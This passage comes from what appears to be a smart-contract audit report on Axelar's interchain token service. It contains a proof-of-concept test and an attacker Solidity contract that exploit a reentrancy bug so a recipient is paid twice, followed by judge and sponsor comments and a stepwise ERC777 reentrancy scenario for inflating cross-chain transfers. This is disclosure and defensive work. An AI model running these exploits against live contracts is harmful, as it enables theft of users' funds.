</span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&#39;0x&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payload</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">defaultAbiCoder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                [</span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bytes32&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bytes&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bytes&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bytes&#39;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                [</span><span class=\"mtk12\">SELECTOR_SEND_TOKEN_WITH_DATA</span><span class=\"mtk1\">, </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">service</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">data</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">defaultAbiCoder</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                [</span><span class=\"mtk8\">&#39;string&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;string&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;address&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bytes32&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;bytes32&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;uint256&#39;</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                [</span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">service</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">payload</span><span class=\"mtk1\">), </span><span class=\"mtk11\">getRandomBytes32</span><span class=\"mtk1\">(), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">,</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// expressPayer express pays triggering the reentrancy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">service</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">expressPayer</span><span class=\"mtk1\">).</span><span class=\"mtk11\">expressReceiveTokenWithData</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">service</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// recipient has gotten both the cross chain and express transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">*</span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span></code></pre>\n<p>And <code>its/test/ExpressRecipient.sol</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: MIT</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> ^</span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">MockAxelarGateway</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;./MockAxelarGateway.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">IInterchainTokenExpressExecutable</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../interfaces/IInterchainTokenExpressExecutable.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">AxelarExecutable</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../../gmp-sdk/executable/AxelarExecutable.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">AddressBytesUtils</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../libraries/AddressBytesUtils.sol&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ExpressRecipient</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">IInterchainTokenExpressExecutable</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">AddressBytesUtils</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">address</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">MockAxelarGateway</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">AxelarExecutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">interchainTokenService</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MockAxelarGateway</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_gateway_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">AxelarExecutable</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_its</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sourceAddress</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gateway</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_gateway_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">interchainTokenService</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_its</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_sourceAddress</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_commandId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">params</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_params</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">commandId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_commandId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expressExecuteWithInterchainToken</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sadd</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// this uses the mock call from tests but a real reporter would</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// have all data needed to make this call the proper way</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">gateway</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approveContractCall</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">, </span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">payload</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">),</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk11\">toBytes</span><span class=\"mtk1\">(),</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span><span class=\"mtk12\">sadd</span><span class=\"mtk1\">,</span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// do the reentrancy and execute the transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">interchainTokenService</span><span class=\"mtk1\">.</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">commandId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceChain</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sourceAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">payload</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">executeWithInterchainToken</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> , </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> , </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> , </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> , </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using <code>_setExpressReceiveTokenWithData</code> before external calls.</p>\n<h3 id=\"assessed-type\" style=\"position:relative;\"><a href=\"#assessed-type\" aria-label=\"assessed type permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Reentrancy</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/349#issuecomment-1702508452\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Besides being very difficult to follow and understand, there are many assumptions on trust assumption violations. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/349#issuecomment-1711755190\">deanamiel (Axelar) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This vulnerability has been addressed. See PR <a href=\"https://github.com/axelarnetwork/interchain-token-service/pull/102\">here</a>. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/349#issuecomment-1711931540\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>After a more thorough review, it is evident that the <code>InterchainTokenService.expressReceiveTokenWithData</code>, and, under certain conditions such as the use of ERC-777 tokens, <code>InterchainTokenService.expressReceiveToken</code> functions are vulnerable to reentrancy due to violating the CEI-pattern. </p>\n<p>Consequently, funds can be stolen by an attacker from actors who attempt to fulfill token transfers ahead of time via the express mechanism. Thus, considering this submission as a valid high-severity finding.</p>\n<p>Hats off to the wardens who spotted this vulnerability!</p>\n</blockquote>\n<hr>\n<h2 id=\"h-02-erc777-and-similar-token-implementations-allow-a-stealing-of-funds-when-transferring-tokens\" style=\"position:relative;\"><a href=\"#h-02-erc777-and-similar-token-implementations-allow-a-stealing-of-funds-when-transferring-tokens\" aria-label=\"h 02 erc777 and similar token implementations allow a stealing of funds when transferring tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/317\">[H-02] ERC777 and similar token implementations allow a stealing of funds when transferring tokens</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/317\">Jeiwan</a>, also found by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/369\">nobody2018</a></em></p>\n<p>A malicious actor can trick a <code>TokenManager</code> into thinking that a bigger amount of tokens were transferred. On the destination chain, the malicious actor will be able to receive more tokens than they sent on the source chain.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLockUnlock.sol#L16\">TokenManagerLockUnlock</a> and <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLiquidityPool.sol#L17\">TokenManagerLiquidityPool</a> are <code>TokenManager</code> implementations that transfer tokens from/to users when sending tokens cross-chain. The low-level <code>_takeToken</code> function (<a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLiquidityPool.sol#L77\">TokenManagerLiquidityPool._takeToken</a>, <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLockUnlock.sol#L44\">TokenManagerLockUnlock._takeToken</a>) is used to take tokens from a user on the source chain before emitting a cross-chain message, e.g. via the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L83\">TokenManager.sendToken</a> function. The function computes the difference in the balance of the liquidity pool or the token manager before and after the transfer, to track the actual amount of tokens transferred. The amount is then <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L90-L99\">passed in the cross-chain message</a> to tell the <code>InterchainTokenService</code> contract on the destination chain <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L610\">how many tokens to give to the recipient</a>.</p>\n<p>The <code>_takeToken</code> function, however, is not protected from reentrance, which opens up the following attack scenario:</p>\n<ol>\n<li>A malicious contract initiates transferring of 100 ERC777 tokens by calling <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L83\">TokenManager.sendToken</a>.</li>\n<li>The <code>_takeToken</code> function calls <code>transferFrom</code> on the ERC777 token contract, which calls the <a href=\"https://eips.ethereum.org/EIPS/eip-777#erc777tokenssender-and-the-tokenstosend-hook\">tokensToSend</a> hook on the malicious contract (the sender).</li>\n<li>In the hook, the malicious contract makes another call to <code>TokenManager.sendToken</code> and sends 100 more tokens.</li>\n<li>In the nested <code>_takeToken</code> call, the balance change will equal 100 since, in ERC777, the balance state is updated only after the <code>tokensToSend</code> hook, so only the re-entered token transfer will be counted.</li>\n<li>The re-entered call to <code>TokenManager.sendToken</code> will result in 100 tokens transferred cross-chain.</li>\n<li>In the first <code>_takeToken</code> call, the balance change will equal 200 because the balance of the receiver will increase twice during the <code>transferFrom</code> call; once for the first call and once for the re-entered call.</li>\n<li>As a result, the malicious contract will transfer 100+100 = 200 tokens, but the <code>TokenManager</code> contract will emit two cross-chain messages; one will transfer 100 tokens (the re-entered call) and the other will transfer 200 tokens (the first call). This will let the malicious actor to receive 300 tokens on the destination chain, while spending only 200 tokens on the source chain.</li>\n</ol>\n<p>Since the protocol is expected to support different implementations of ERC20 tokens, including custom ones, the attack scenario is valid for any token implementation that uses hooks during transfers.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended 